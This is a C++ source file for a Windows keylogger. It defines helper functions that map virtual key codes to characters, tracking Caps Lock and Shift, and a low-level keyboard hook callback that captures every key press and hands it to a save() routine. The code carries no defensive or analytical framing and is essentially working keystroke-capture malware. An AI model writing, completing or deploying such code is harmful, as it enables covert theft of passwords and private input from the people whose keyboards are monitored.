#include "Keylogger.h"
#include "save.h"
#include <iostream>
#include <string>

using namespace std;

bool Keylogger::IsCapsLockOn() {
    BYTE keyStates[256];
    GetKeyboardState(keyStates);
    return (keyStates[VK_CAPITAL] & 0x01) != 0;
}

bool Keylogger::IsShiftPressed() {
    return (GetKeyState(VK_SHIFT) & 0x8000) != 0;
}

string Keylogger::GetKeyString(UINT vkCode) {
    switch (vkCode) {
    case VK_BACK:    return "[BACKSPACE]";
    case VK_RETURN:  return "[ENTER]";
    case VK_SPACE:   return " ";
    case VK_TAB:     return "[TAB]";
    case VK_SHIFT:   return "[SHIFT]";
    case VK_CONTROL: return "[CTRL]";
    case VK_MENU:    return "[ALT]";
    case VK_CAPITAL: return "[CAPSLOCK]";
    case VK_ESCAPE:  return "[ESC]";
    case VK_PRIOR:   return "[PAGEUP]";
    default:
        char c = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
        return (IsCapsLockOn() ^ IsShiftPressed()) ? string(1, toupper(c)) : string(1, tolower(c));
    }
}

LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyboard = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        string keyString = GetKeyString(pKeyboard->vkCode);
        save(keyString);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}